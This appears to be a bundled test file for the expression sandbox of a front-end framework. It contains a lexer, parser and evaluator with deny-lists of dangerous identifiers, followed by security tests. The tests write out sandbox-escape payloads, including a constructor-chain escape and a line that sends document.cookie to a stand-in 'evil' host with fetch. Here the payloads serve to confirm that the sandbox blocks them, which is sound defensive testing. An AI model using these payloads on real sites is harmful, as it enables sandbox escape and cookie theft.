// tests/setup.ts
import { Window } from "happy-dom";
var win = new Window({
  url: "http://localhost:5000"
});
globalThis.window = win;
globalThis.document = win.document;
globalThis.HTMLElement = win.HTMLElement;
globalThis.HTMLInputElement = win.HTMLInputElement;
globalThis.HTMLSelectElement = win.HTMLSelectElement;
globalThis.HTMLTextAreaElement = win.HTMLTextAreaElement;
globalThis.HTMLButtonElement = win.HTMLButtonElement;
globalThis.CustomEvent = win.CustomEvent;
globalThis.Event = win.Event;
globalThis.MouseEvent = win.MouseEvent;
globalThis.KeyboardEvent = win.KeyboardEvent;
globalThis.Node = win.Node;
globalThis.localStorage = win.localStorage;
globalThis.sessionStorage = win.sessionStorage;
globalThis.requestAnimationFrame = (cb) => setTimeout(cb, 16);
try {
  Object.defineProperty(globalThis.navigator, "clipboard", {
    value: {
      writeText: async (_text) => Promise.resolve()
    },
    configurable: true
  });
} catch {
}
globalThis.MutationObserver = win.MutationObserver || class {
  observe() {
  }
  disconnect() {
  }
};
globalThis.IntersectionObserver = class {
  callback;
  constructor(cb) {
    this.callback = cb;
  }
  observe(el) {
    this.callback([{ isIntersecting: true, target: el }]);
  }
  disconnect() {
  }
};

// tests/expression-sandbox.test.ts
import { describe, it } from "node:test";
import assert from "node:assert/strict";

// src/directives/security.ts
var trustedTypesPolicy = null;
if (typeof window !== "undefined" && window.trustedTypes?.createPolicy) {
  try {
    trustedTypesPolicy = window.trustedTypes.createPolicy("laughtale-html", {
      createHTML: (s) => s
    });
  } catch {
  }
}

// src/directives/expression/lexer.ts
var FORBIDDEN_KEYWORDS = /* @__PURE__ */ new Set([
  "new",
  "function",
  "class",
  "import",
  "export",
  "return",
  "with",
  "while",
  "for",
  "do",
  "switch",
  "case",
  "break",
  "continue",
  "debugger",
  "var",
  "let",
  "const",
  "throw",
  "try",
  "catch",
  "finally",
  "yield",
  "async",
  "await",
  "delete",
  "void"
]);
var Lexer = class {
  src;
  pos = 0;
  len;
  constructor(src) {
    this.src = src;
    this.len = src.length;
  }
  tokenize() {
    const tokens = [];
    while (this.pos < this.len) {
      this.skipWhitespace();
      if (this.pos >= this.len) break;
      const ch = this.src[this.pos];
      const start = this.pos;
      if (ch === "/" && this.pos + 1 < this.len) {
        if (this.src[this.pos + 1] === "/") {
          this.pos += 2;
          while (this.pos < this.len && this.src[this.pos] !== "\n") this.pos++;
          continue;
        }
        if (this.src[this.pos + 1] === "*") {
          this.pos += 2;
          while (this.pos + 1 < this.len && !(this.src[this.pos] === "*" && this.src[this.pos + 1] === "/")) {
            this.pos++;
          }
          this.pos += 2;
          continue;
        }
      }
      if (this.isDigit(ch) || ch === "." && this.pos + 1 < this.len && this.isDigit(this.src[this.pos + 1])) {
        tokens.push(this.readNumber());
        continue;
      }
      if (ch === '"' || ch === "'") {
        tokens.push(this.readString(ch));
        continue;
      }
      if (ch === "`") {
        tokens.push(this.readTemplateLiteral());
        continue;
      }
      if (this.isIdentStart(ch)) {
        tokens.push(this.readIdentifierOrKeyword());
        continue;
      }
      const multi = this.readOperatorOrPunctuation();
      if (multi) {
        tokens.push(multi);
        continue;
      }
      throw new Error(`Unexpected character '${ch}' at position ${this.pos}`);
    }
    tokens.push({ type: "EOF", value: "", pos: this.pos });
    return tokens;
  }
  skipWhitespace() {
    while (this.pos < this.len) {
      const ch = this.src.charCodeAt(this.pos);
      if (ch === 32 || ch === 9 || ch === 10 || ch === 13) {
        this.pos++;
      } else {
        break;
      }
    }
  }
  isDigit(ch) {
    return ch >= "0" && ch <= "9";
  }
  isIdentStart(ch) {
    return ch >= "a" && ch <= "z" || ch >= "A" && ch <= "Z" || ch === "_" || ch === "$";
  }
  isIdentPart(ch) {
    return this.isIdentStart(ch) || this.isDigit(ch);
  }
  readNumber() {
    const start = this.pos;
    let isFloat = false;
    if (this.src[this.pos] === ".") {
      isFloat = true;
      this.pos++;
    }
    while (this.pos < this.len) {
      const ch = this.src[this.pos];
      if (this.isDigit(ch)) {
        this.pos++;
      } else if (ch === "." && !isFloat) {
        isFloat = true;
        this.pos++;
      } else if ((ch === "e" || ch === "E") && this.pos + 1 < this.len) {
        this.pos++;
        if (this.src[this.pos] === "+" || this.src[this.pos] === "-") {
          this.pos++;
        }
        while (this.pos < this.len && this.isDigit(this.src[this.pos])) {
          this.pos++;
        }
        break;
      } else {
        break;
      }
    }
    const raw = this.src.slice(start, this.pos);
    return {
      type: "NUMBER",
      value: raw,
      raw: Number(raw),
      pos: start
    };
  }
  readString(quote) {
    const start = this.pos;
    this.pos++;
    let val = "";
    while (this.pos < this.len) {
      const ch = this.src[this.pos];
      if (ch === quote) {
        this.pos++;
        return {
          type: "STRING",
          value: val,
          raw: val,
          pos: start
        };
      }
      if (ch === "\\" && this.pos + 1 < this.len) {
        this.pos++;
        const esc = this.src[this.pos];
        if (esc === "n") val += "\n";
        else if (esc === "r") val += "\r";
        else if (esc === "t") val += "	";
        else if (esc === "\\") val += "\\";
        else if (esc === quote) val += quote;
        else val += esc;
        this.pos++;
      } else {
        val += ch;
        this.pos++;
      }
    }
    throw new Error(`Unterminated string starting at position ${start}`);
  }
  readTemplateLiteral() {
    const start = this.pos;
    this.pos++;
    let val = "";
    while (this.pos < this.len) {
      const ch = this.src[this.pos];
      if (ch === "`") {
        this.pos++;
        return {
          type: "TEMPLATE_NO_SUBST",
          value: val,
          raw: val,
          pos: start
        };
      }
      if (ch === "$" && this.pos + 1 < this.len && this.src[this.pos + 1] === "{") {
        this.pos += 2;
        return {
          type: "TEMPLATE_HEAD",
          value: val,
          raw: val,
          pos: start
        };
      }
      if (ch === "\\" && this.pos + 1 < this.len) {
        this.pos++;
        val += this.src[this.pos];
        this.pos++;
      } else {
        val += ch;
        this.pos++;
      }
    }
    throw new Error(`Unterminated template string starting at position ${start}`);
  }
  readIdentifierOrKeyword() {
    const start = this.pos;
    while (this.pos < this.len && this.isIdentPart(this.src[this.pos])) {
      this.pos++;
    }
    const word = this.src.slice(start, this.pos);
    if (word === "true") {
      return { type: "BOOLEAN", value: word, raw: true, pos: start };
    }
    if (word === "false") {
      return { type: "BOOLEAN", value: word, raw: false, pos: start };
    }
    if (word === "null") {
      return { type: "NULL", value: word, raw: null, pos: start };
    }
    if (word === "undefined") {
      return { type: "UNDEFINED", value: word, raw: void 0, pos: start };
    }
    if (FORBIDDEN_KEYWORDS.has(word)) {
      return { type: "FORBIDDEN_KEYWORD", value: word, pos: start };
    }
    return { type: "IDENTIFIER", value: word, pos: start };
  }
  readOperatorOrPunctuation() {
    const start = this.pos;
    const rest = this.src.slice(start);
    const threeChar = ["===", "!==", ">>>", "**=", "&&=", "||=", "??="];
    for (const op of threeChar) {
      if (rest.startsWith(op)) {
        this.pos += 3;
        return { type: "OPERATOR", value: op, pos: start };
      }
    }
    const twoChar = [
      "==",
      "!=",
      "<=",
      ">=",
      "&&",
      "||",
      "??",
      "++",
      "--",
      "+=",
      "-=",
      "*=",
      "/=",
      "%=",
      "?.",
      "=>"
    ];
    for (const op of twoChar) {
      if (rest.startsWith(op)) {
        this.pos += 2;
        if (op === "=>") {
          return { type: "FORBIDDEN_KEYWORD", value: op, pos: start };
        }
        if (op === "?.") {
          return { type: "PUNCTUATION", value: op, pos: start };
        }
        return { type: "OPERATOR", value: op, pos: start };
      }
    }
    const singleCharPunct = "()[]{},;.:?";
    const ch = this.src[this.pos];
    if (singleCharPunct.includes(ch)) {
      this.pos++;
      return { type: "PUNCTUATION", value: ch, pos: start };
    }
    const singleCharOps = "+-*/%&|^!~<>=";
    if (singleCharOps.includes(ch)) {
      this.pos++;
      return { type: "OPERATOR", value: ch, pos: start };
    }
    return null;
  }
};

// src/directives/expression/parser.ts
var ParseError = class extends Error {
  pos;
  constructor(message, pos = 0) {
    super(`[SoftMax.LaughTale Expression Parser] ${message} at pos ${pos}`);
    this.name = "ParseError";
    this.pos = pos;
  }
};
var Parser = class _Parser {
  tokens;
  current = 0;
  constructor(tokens) {
    this.tokens = tokens;
  }
  static parse(source) {
    const trimmed = source.trim();
    if (!trimmed) {
      return { type: "Literal", value: void 0 };
    }
    const lexer = new Lexer(trimmed);
    const tokens = lexer.tokenize();
    const parser = new _Parser(tokens);
    const node = parser.parseStatementSequence();
    if (!parser.isAtEnd()) {
      throw new ParseError(`Unexpected token '${parser.peek().value}'`, parser.peek().pos);
    }
    return node;
  }
  parseStatementSequence() {
    const exprs = [];
    while (!this.isAtEnd()) {
      const expr = this.parseExpression();
      exprs.push(expr);
      if (this.match("PUNCTUATION", ";")) {
        while (this.match("PUNCTUATION", ";")) {
        }
      } else {
        break;
      }
    }
    if (exprs.length === 0) {
      return { type: "Literal", value: void 0 };
    }
    if (exprs.length === 1) {
      return exprs[0];
    }
    return { type: "SequenceExpression", expressions: exprs };
  }
  parseExpression() {
    return this.parseAssignment();
  }
  parseAssignment() {
    const expr = this.parseTernary();
    const assignOps = ["=", "+=", "-=", "*=", "/="];
    if (this.check("OPERATOR") && assignOps.includes(this.peek().value)) {
      const opToken = this.advance();
      const right = this.parseAssignment();
      if (expr.type === "Identifier" || expr.type === "MemberExpression" || expr.type === "IndexExpression") {
        return {
          type: "AssignmentExpression",
          operator: opToken.value,
          left: expr,
          right
        };
      }
      throw new ParseError("Invalid left-hand side in assignment", opToken.pos);
    }
    return expr;
  }
  parseTernary() {
    let expr = this.parseNullish();
    if (this.match("PUNCTUATION", "?") || this.match("OPERATOR", "?")) {
      const consequent = this.parseExpression();
      if (!this.match("PUNCTUATION", ":") && !this.match("OPERATOR", ":")) {
        throw new ParseError("Expected ':' in conditional expression", this.peek().pos);
      }
      const alternate = this.parseExpression();
      expr = {
        type: "ConditionalExpression",
        test: expr,
        consequent,
        alternate
      };
    }
    return expr;
  }
  parseNullish() {
    let left = this.parseLogicalOr();
    while (this.match("OPERATOR", "??")) {
      const right = this.parseLogicalOr();
      left = {
        type: "LogicalExpression",
        operator: "??",
        left,
        right
      };
    }
    return left;
  }
  parseLogicalOr() {
    let left = this.parseLogicalAnd();
    while (this.match("OPERATOR", "||")) {
      const right = this.parseLogicalAnd();
      left = {
        type: "LogicalExpression",
        operator: "||",
        left,
        right
      };
    }
    return left;
  }
  parseLogicalAnd() {
    let left = this.parseEquality();
    while (this.match("OPERATOR", "&&")) {
      const right = this.parseEquality();
      left = {
        type: "LogicalExpression",
        operator: "&&",
        left,
        right
      };
    }
    return left;
  }
  parseEquality() {
    let left = this.parseRelational();
    while (this.check("OPERATOR") && ["===", "!==", "==", "!="].includes(this.peek().value)) {
      const op = this.advance().value;
      const right = this.parseRelational();
      left = {
        type: "BinaryExpression",
        operator: op,
        left,
        right
      };
    }
    return left;
  }
  parseRelational() {
    let left = this.parseAdditive();
    while (this.check("OPERATOR") && ["<", "<=", ">", ">=", "in", "instanceof"].includes(this.peek().value)) {
      const op = this.advance().value;
      const right = this.parseAdditive();
      left = {
        type: "BinaryExpression",
        operator: op,
        left,
        right
      };
    }
    return left;
  }
  parseAdditive() {
    let left = this.parseMultiplicative();
    while (this.check("OPERATOR") && ["+", "-"].includes(this.peek().value)) {
      const op = this.advance().value;
      const right = this.parseMultiplicative();
      left = {
        type: "BinaryExpression",
        operator: op,
        left,
        right
      };
    }
    return left;
  }
  parseMultiplicative() {
    let left = this.parseUnary();
    while (this.check("OPERATOR") && ["*", "/", "%"].includes(this.peek().value)) {
      const op = this.advance().value;
      const right = this.parseUnary();
      left = {
        type: "BinaryExpression",
        operator: op,
        left,
        right
      };
    }
    return left;
  }
  parseUnary() {
    if (this.check("OPERATOR") && ["!", "+", "-", "~"].includes(this.peek().value)) {
      const op = this.advance().value;
      const arg = this.parseUnary();
      return {
        type: "UnaryExpression",
        operator: op,
        argument: arg
      };
    }
    if (this.check("IDENTIFIER") && this.peek().value === "typeof") {
      this.advance();
      const arg = this.parseUnary();
      return {
        type: "UnaryExpression",
        operator: "typeof",
        argument: arg
      };
    }
    if (this.check("OPERATOR") && (this.peek().value === "++" || this.peek().value === "--")) {
      const op = this.advance().value;
      const arg = this.parsePostfix();
      if (arg.type === "Identifier" || arg.type === "MemberExpression" || arg.type === "IndexExpression") {
        return {
          type: "UpdateExpression",
          operator: op,
          argument: arg,
          prefix: true
        };
      }
      throw new ParseError(`Invalid left-hand side in prefix ${op} operation`, this.peek().pos);
    }
    return this.parsePostfix();
  }
  parsePostfix() {
    let expr = this.parsePrimary();
    while (true) {
      if (this.match("PUNCTUATION", ".")) {
        const propToken = this.consume("IDENTIFIER", void 0, "Expected property identifier after .");
        this.validatePropertyName(propToken.value, propToken.pos);
        expr = {
          type: "MemberExpression",
          object: expr,
          property: propToken.value
        };
      } else if (this.match("OPERATOR", "?.") || this.match("PUNCTUATION", "?.")) {
        if (this.match("PUNCTUATION", "[")) {
          const index = this.parseExpression();
          this.consume("PUNCTUATION", "]", "Expected ']' after optional index");
          expr = {
            type: "IndexExpression",
            object: expr,
            index,
            optional: true
          };
        } else if (this.match("PUNCTUATION", "(")) {
          const args = this.parseArguments();
          expr = {
            type: "CallExpression",
            callee: expr,
            args,
            optional: true
          };
        } else {
          const propToken = this.consume("IDENTIFIER", void 0, "Expected property identifier after ?.");
          this.validatePropertyName(propToken.value, propToken.pos);
          expr = {
            type: "MemberExpression",
            object: expr,
            property: propToken.value,
            optional: true
          };
        }
      } else if (this.match("PUNCTUATION", "[")) {
        const index = this.parseExpression();
        this.consume("PUNCTUATION", "]", "Expected ']' after computed index");
        expr = {
          type: "IndexExpression",
          object: expr,
          index
        };
      } else if (this.match("PUNCTUATION", "(")) {
        const args = this.parseArguments();
        expr = {
          type: "CallExpression",
          callee: expr,
          args
        };
      } else if (this.check("OPERATOR") && (this.peek().value === "++" || this.peek().value === "--")) {
        const op = this.advance().value;
        if (expr.type === "Identifier" || expr.type === "MemberExpression" || expr.type === "IndexExpression") {
          expr = {
            type: "UpdateExpression",
            operator: op,
            argument: expr,
            prefix: false
          };
        } else {
          throw new ParseError(`Invalid target for postfix ${op}`, this.peek().pos);
        }
      } else {
        break;
      }
    }
    return expr;
  }
  parseArguments() {
    const args = [];
    if (!this.check("PUNCTUATION", ")")) {
      do {
        if (this.check("PUNCTUATION", ")")) break;
        args.push(this.parseExpression());
      } while (this.match("PUNCTUATION", ","));
    }
    this.consume("PUNCTUATION", ")", "Expected ')' after argument list");
    return args;
  }
  parsePrimary() {
    const token = this.peek();
    if (token.type === "FORBIDDEN_KEYWORD") {
      throw new ParseError(`Forbidden keyword '${token.value}' is prohibited in directive expressions`, token.pos);
    }
    if (token.type === "NUMBER") {
      this.advance();
      return { type: "Literal", value: token.raw };
    }
    if (token.type === "STRING") {
      this.advance();
      return { type: "Literal", value: token.raw };
    }
    if (token.type === "BOOLEAN") {
      this.advance();
      return { type: "Literal", value: token.raw };
    }
    if (token.type === "NULL") {
      this.advance();
      return { type: "Literal", value: null };
    }
    if (token.type === "UNDEFINED") {
      this.advance();
      return { type: "Literal", value: void 0 };
    }
    if (token.type === "TEMPLATE_NO_SUBST") {
      this.advance();
      return {
        type: "TemplateLiteral",
        quasis: [token.value],
        expressions: []
      };
    }
    if (token.type === "IDENTIFIER") {
      this.advance();
      this.validatePropertyName(token.value, token.pos);
      return { type: "Identifier", name: token.value };
    }
    if (this.match("PUNCTUATION", "(")) {
      const expr = this.parseExpression();
      this.consume("PUNCTUATION", ")", "Expected ')' after grouped expression");
      return expr;
    }
    if (this.match("PUNCTUATION", "[")) {
      const elements = [];
      if (!this.check("PUNCTUATION", "]")) {
        do {
          if (this.check("PUNCTUATION", "]")) break;
          elements.push(this.parseExpression());
        } while (this.match("PUNCTUATION", ","));
      }
      this.consume("PUNCTUATION", "]", "Expected ']' after array literal");
      return { type: "ArrayLiteral", elements };
    }
    if (this.match("PUNCTUATION", "{")) {
      const properties = [];
      if (!this.check("PUNCTUATION", "}")) {
        do {
          if (this.check("PUNCTUATION", "}")) break;
          let key = "";
          if (this.check("IDENTIFIER") || this.check("STRING")) {
            const kToken = this.advance();
            key = kToken.value;
          } else {
            throw new ParseError("Expected property name in object literal", this.peek().pos);
          }
          let val;
          if (this.match("PUNCTUATION", ":")) {
            val = this.parseExpression();
          } else {
            val = { type: "Identifier", name: key };
          }
          properties.push({ key, value: val });
        } while (this.match("PUNCTUATION", ","));
      }
      this.consume("PUNCTUATION", "}", "Expected '}' after object literal");
      return { type: "ObjectLiteral", properties };
    }
    throw new ParseError(`Unexpected token '${token.value}'`, token.pos);
  }
  validatePropertyName(name, pos) {
    const forbiddenProps = ["constructor", "__proto__", "prototype", "__defineGetter__", "__defineSetter__", "__lookupGetter__", "__lookupSetter__"];
    if (forbiddenProps.includes(name)) {
      throw new ParseError(`Access to restricted property '${name}' is blocked for security`, pos);
    }
  }
  match(type, value) {
    if (this.check(type, value)) {
      this.advance();
      return true;
    }
    return false;
  }
  check(type, value) {
    if (this.isAtEnd()) return false;
    const t = this.peek();
    if (t.type !== type) return false;
    if (value !== void 0 && t.value !== value) return false;
    return true;
  }
  advance() {
    if (!this.isAtEnd()) this.current++;
    return this.previous();
  }
  isAtEnd() {
    return this.peek().type === "EOF";
  }
  peek() {
    return this.tokens[this.current] ?? { type: "EOF", value: "", pos: 0 };
  }
  previous() {
    return this.tokens[this.current - 1];
  }
  consume(type, value, errMsg) {
    if (this.check(type, value)) return this.advance();
    const t = this.peek();
    throw new ParseError(errMsg ?? `Expected token ${type} ${value ?? ""} but got '${t.value}'`, t.pos);
  }
};

// src/directives/expression/evaluator.ts
var FORBIDDEN_PROPERTIES = /* @__PURE__ */ new Set([
  "constructor",
  "__proto__",
  "prototype",
  "__defineGetter__",
  "__defineSetter__",
  "__lookupGetter__",
  "__lookupSetter__"
]);
var FORBIDDEN_IDENTIFIERS = /* @__PURE__ */ new Set([
  "window",
  "document",
  "globalThis",
  "top",
  "parent",
  "frames",
  "self",
  "location",
  "localStorage",
  "sessionStorage",
  "indexedDB",
  "cookie",
  "eval",
  "Function",
  "XMLHttpRequest",
  "fetch",
  "setTimeout",
  "setInterval",
  "setImmediate",
  "clearTimeout",
  "clearInterval",
  "clearImmediate",
  "process",
  "require",
  "importScripts"
]);
var SAFE_BUILTINS = {
  Math: Object.freeze(Math),
  Number: Object.freeze(Number),
  String: Object.freeze(String),
  Boolean: Object.freeze(Boolean),
  Date: Object.freeze(Date),
  Array: Object.freeze(Array),
  Object: Object.freeze(Object),
  JSON: Object.freeze(JSON),
  parseInt,
  parseFloat,
  isNaN,
  isFinite,
  encodeURI,
  encodeURIComponent,
  decodeURI,
  decodeURIComponent
};
var astCache = /* @__PURE__ */ new Map();
var MAX_CACHE_SIZE = 500;
function parseExpressionToAst(expr) {
  const trimmed = expr.trim();
  if (!trimmed) return null;
  let ast = astCache.get(trimmed);
  if (!ast) {
    ast = Parser.parse(trimmed);
    if (astCache.size >= MAX_CACHE_SIZE) {
      const firstKey = astCache.keys().next().value;
      if (firstKey) astCache.delete(firstKey);
    }
    astCache.set(trimmed, ast);
  }
  return ast;
}
function evaluateAst(ast, state, extraContext = {}) {
  switch (ast.type) {
    case "Literal":
      return ast.value;
    case "Identifier": {
      const name = ast.name;
      if (FORBIDDEN_PROPERTIES.has(name) || FORBIDDEN_IDENTIFIERS.has(name)) {
        console.warn(`[SoftMax.LaughTale Security] Blocked access to forbidden identifier: "${name}"`);
        return void 0;
      }
      if (extraContext && Object.prototype.hasOwnProperty.call(extraContext, name)) {
        return extraContext[name];
      }
      if (state && Object.prototype.hasOwnProperty.call(state, name)) {
        return state[name];
      }
      if (state && name in state && !FORBIDDEN_PROPERTIES.has(name)) {
        return state[name];
      }
      if (Object.prototype.hasOwnProperty.call(SAFE_BUILTINS, name)) {
        return SAFE_BUILTINS[name];
      }
      return void 0;
    }
    case "UnaryExpression": {
      const val = evaluateAst(ast.argument, state, extraContext);
      switch (ast.operator) {
        case "!":
          return !val;
        case "+":
          return +val;
        case "-":
          return -val;
        case "~":
          return ~val;
        case "typeof":
          return typeof val;
        default:
          return void 0;
      }
    }
    case "BinaryExpression": {
      const left = evaluateAst(ast.left, state, extraContext);
      const right = evaluateAst(ast.right, state, extraContext);
      switch (ast.operator) {
        case "+":
          return left + right;
        case "-":
          return left - right;
        case "*":
          return left * right;
        case "/":
          return left / right;
        case "%":
          return left % right;
        case "==":
          return left == right;
        case "===":
          return left === right;
        case "!=":
          return left != right;
        case "!==":
          return left !== right;
        case "<":
          return left < right;
        case "<=":
          return left <= right;
        case ">":
          return left > right;
        case ">=":
          return left >= right;
        case "in":
          return typeof right === "object" && right !== null ? left in right : false;
        case "instanceof":
          return typeof right === "function" ? left instanceof right : false;
        default:
          return void 0;
      }
    }
    case "LogicalExpression": {
      const left = evaluateAst(ast.left, state, extraContext);
      switch (ast.operator) {
        case "&&":
          return left ? evaluateAst(ast.right, state, extraContext) : left;
        case "||":
          return left ? left : evaluateAst(ast.right, state, extraContext);
        case "??":
          return left !== null && left !== void 0 ? left : evaluateAst(ast.right, state, extraContext);
        default:
          return void 0;
      }
    }
    case "ConditionalExpression": {
      const test = evaluateAst(ast.test, state, extraContext);
      return test ? evaluateAst(ast.consequent, state, extraContext) : evaluateAst(ast.alternate, state, extraContext);
    }
    case "MemberExpression": {
      const obj = evaluateAst(ast.object, state, extraContext);
      if (obj == null) {
        return void 0;
      }
      const prop = ast.property;
      if (FORBIDDEN_PROPERTIES.has(prop) || FORBIDDEN_IDENTIFIERS.has(prop)) {
        console.warn(`[SoftMax.LaughTale Security] Blocked access to restricted property: "${prop}"`);
        return void 0;
      }
      return obj[prop];
    }
    case "IndexExpression": {
      const obj = evaluateAst(ast.object, state, extraContext);
      if (obj == null) {
        return void 0;
      }
      const idx = evaluateAst(ast.index, state, extraContext);
      const prop = String(idx);
      if (FORBIDDEN_PROPERTIES.has(prop) || FORBIDDEN_IDENTIFIERS.has(prop)) {
        console.warn(`[SoftMax.LaughTale Security] Blocked access to restricted property: "${prop}"`);
        return void 0;
      }
      return obj[idx];
    }
    case "CallExpression": {
      let fn;
      let thisArg = state;
      if (ast.callee.type === "MemberExpression") {
        const obj = evaluateAst(ast.callee.object, state, extraContext);
        if (obj == null) return void 0;
        const prop = ast.callee.property;
        if (FORBIDDEN_PROPERTIES.has(prop) || FORBIDDEN_IDENTIFIERS.has(prop)) {
          console.warn(`[SoftMax.LaughTale Security] Blocked call to restricted property: "${prop}"`);
          return void 0;
        }
        fn = obj[prop];
        thisArg = obj;
      } else if (ast.callee.type === "IndexExpression") {
        const obj = evaluateAst(ast.callee.object, state, extraContext);
        if (obj == null) return void 0;
        const idx = evaluateAst(ast.callee.index, state, extraContext);
        const prop = String(idx);
        if (FORBIDDEN_PROPERTIES.has(prop) || FORBIDDEN_IDENTIFIERS.has(prop)) {
          console.warn(`[SoftMax.LaughTale Security] Blocked call to restricted property: "${prop}"`);
          return void 0;
        }
        fn = obj[idx];
        thisArg = obj;
      } else {
        fn = evaluateAst(ast.callee, state, extraContext);
      }
      if (typeof fn !== "function") {
        return void 0;
      }
      if (fn === Function || typeof eval !== "undefined" && fn === eval) {
        console.warn("[SoftMax.LaughTale Security] Blocked execution of dynamic Function/eval constructor");
        return void 0;
      }
      const args = ast.args.map((arg) => evaluateAst(arg, state, extraContext));
      return fn.apply(thisArg, args);
    }
    case "ArrayLiteral":
      return ast.elements.map((el) => evaluateAst(el, state, extraContext));
    case "ObjectLiteral": {
      const obj = {};
      for (const prop of ast.properties) {
        if (FORBIDDEN_PROPERTIES.has(prop.key)) {
          console.warn(`[SoftMax.LaughTale Security] Blocked object literal key: "${prop.key}"`);
          continue;
        }
        obj[prop.key] = evaluateAst(prop.value, state, extraContext);
      }
      return obj;
    }
    case "TemplateLiteral": {
      return ast.quasis.join("");
    }
    case "AssignmentExpression": {
      const val = evaluateAst(ast.right, state, extraContext);
      return applyAssignment(ast.left, ast.operator, val, state, extraContext);
    }
    case "UpdateExpression": {
      return applyUpdate(ast.argument, ast.operator, ast.prefix, state, extraContext);
    }
    case "SequenceExpression": {
      let result = void 0;
      for (const expr of ast.expressions) {
        result = evaluateAst(expr, state, extraContext);
      }
      return result;
    }
    default:
      return void 0;
  }
}
function applyAssignment(target, operator, value, state, extraContext) {
  if (target.type === "Identifier") {
    const name = target.name;
    if (FORBIDDEN_PROPERTIES.has(name) || FORBIDDEN_IDENTIFIERS.has(name)) {
      console.warn(`[SoftMax.LaughTale Security] Blocked assignment to restricted identifier: "${name}"`);
      return void 0;
    }
    const targetObj = extraContext && name in extraContext ? extraContext : state;
    const current = targetObj[name];
    let next = value;
    if (operator === "+=") next = current + value;
    else if (operator === "-=") next = current - value;
    else if (operator === "*=") next = current * value;
    else if (operator === "/=") next = current / value;
    targetObj[name] = next;
    return next;
  }
  if (target.type === "MemberExpression") {
    const obj = evaluateAst(target.object, state, extraContext);
    if (obj == null) return void 0;
    const prop = target.property;
    if (FORBIDDEN_PROPERTIES.has(prop) || FORBIDDEN_IDENTIFIERS.has(prop)) {
      console.warn(`[SoftMax.LaughTale Security] Blocked assignment to restricted property: "${prop}"`);
      return void 0;
    }
    const current = obj[prop];
    let next = value;
    if (operator === "+=") next = current + value;
    else if (operator === "-=") next = current - value;
    else if (operator === "*=") next = current * value;
    else if (operator === "/=") next = current / value;
    obj[prop] = next;
    return next;
  }
  if (target.type === "IndexExpression") {
    const obj = evaluateAst(target.object, state, extraContext);
    if (obj == null) return void 0;
    const idx = evaluateAst(target.index, state, extraContext);
    const prop = String(idx);
    if (FORBIDDEN_PROPERTIES.has(prop) || FORBIDDEN_IDENTIFIERS.has(prop)) {
      console.warn(`[SoftMax.LaughTale Security] Blocked assignment to restricted property: "${prop}"`);
      return void 0;
    }
    const current = obj[idx];
    let next = value;
    if (operator === "+=") next = current + value;
    else if (operator === "-=") next = current - value;
    else if (operator === "*=") next = current * value;
    else if (operator === "/=") next = current / value;
    obj[idx] = next;
    return next;
  }
  return void 0;
}
function applyUpdate(target, operator, prefix, state, extraContext) {
  const delta = operator === "++" ? 1 : -1;
  if (target.type === "Identifier") {
    const name = target.name;
    if (FORBIDDEN_PROPERTIES.has(name) || FORBIDDEN_IDENTIFIERS.has(name)) {
      return void 0;
    }
    const targetObj = extraContext && name in extraContext ? extraContext : state;
    const oldVal = Number(targetObj[name] ?? 0);
    const newVal = oldVal + delta;
    targetObj[name] = newVal;
    return prefix ? newVal : oldVal;
  }
  if (target.type === "MemberExpression") {
    const obj = evaluateAst(target.object, state, extraContext);
    if (obj == null) return void 0;
    const prop = target.property;
    if (FORBIDDEN_PROPERTIES.has(prop) || FORBIDDEN_IDENTIFIERS.has(prop)) {
      return void 0;
    }
    const oldVal = Number(obj[prop] ?? 0);
    const newVal = oldVal + delta;
    obj[prop] = newVal;
    return prefix ? newVal : oldVal;
  }
  if (target.type === "IndexExpression") {
    const obj = evaluateAst(target.object, state, extraContext);
    if (obj == null) return void 0;
    const idx = evaluateAst(target.index, state, extraContext);
    const prop = String(idx);
    if (FORBIDDEN_PROPERTIES.has(prop) || FORBIDDEN_IDENTIFIERS.has(prop)) {
      return void 0;
    }
    const oldVal = Number(obj[idx] ?? 0);
    const newVal = oldVal + delta;
    obj[idx] = newVal;
    return prefix ? newVal : oldVal;
  }
  return void 0;
}

// src/directives/reactivity.ts
function evaluateExpression(expr, state, extraContext = {}) {
  try {
    const ast = parseExpressionToAst(expr);
    if (!ast) return void 0;
    return evaluateAst(ast, state, extraContext);
  } catch (err) {
    console.warn(`[SoftMax.LaughTale] Error evaluating expression "${expr}":`, err);
    return void 0;
  }
}
function executeStatement(stmt, state, extraContext = {}) {
  try {
    const ast = parseExpressionToAst(stmt);
    if (!ast) return;
    evaluateAst(ast, state, extraContext);
  } catch (err) {
    console.warn(`[SoftMax.LaughTale] Error executing statement "${stmt}":`, err);
  }
}

// tests/expression-sandbox.test.ts
describe("Directive Expression Sandbox Security Suite (LT-101)", () => {
  const scope = {
    count: 42,
    user: { name: "Alice", role: "admin" },
    items: ["first", "second", "third"],
    isActive: true,
    add: (a, b) => a + b,
    nested: { inner: { value: 100 } }
  };
  it('Payload 1: [].constructor.constructor("return globalThis")()', () => {
    const res = evaluateExpression('[].constructor.constructor("return globalThis")()', scope);
    assert.equal(res, void 0);
  });
  it("Payload 2: (function(){ return this })()", () => {
    const res = evaluateExpression("(function(){ return this })()", scope);
    assert.equal(res, void 0);
  });
  it("Payload 3: top.document.cookie", () => {
    const res = evaluateExpression("top.document.cookie", scope);
    assert.equal(res, void 0);
  });
  it(`Payload 4: setTimeout("fetch('//evil/'+document.cookie)")`, () => {
    const res = evaluateExpression(`setTimeout("fetch('//evil/'+document.cookie)")`, scope);
    assert.equal(res, void 0);
  });
  it("Escape vector: window", () => {
    assert.equal(evaluateExpression("window", scope), void 0);
    assert.equal(evaluateExpression("window.location", scope), void 0);
  });
  it("Escape vector: document", () => {
    assert.equal(evaluateExpression("document", scope), void 0);
    assert.equal(evaluateExpression("document.cookie", scope), void 0);
  });
  it("Escape vector: globalThis", () => {
    assert.equal(evaluateExpression("globalThis", scope), void 0);
    assert.equal(evaluateExpression("globalThis.process", scope), void 0);
  });
  it("Escape vector: self", () => {
    assert.equal(evaluateExpression("self", scope), void 0);
    assert.equal(evaluateExpression("self.location", scope), void 0);
  });
  it("Escape vector: parent", () => {
    assert.equal(evaluateExpression("parent", scope), void 0);
    assert.equal(evaluateExpression("parent.document", scope), void 0);
  });
  it("Escape vector: frames", () => {
    assert.equal(evaluateExpression("frames", scope), void 0);
    assert.equal(evaluateExpression("frames[0]", scope), void 0);
  });
  it("Escape vector: location", () => {
    assert.equal(evaluateExpression("location", scope), void 0);
    assert.equal(evaluateExpression("location.href", scope), void 0);
  });
  it("Escape vector: localStorage", () => {
    assert.equal(evaluateExpression("localStorage", scope), void 0);
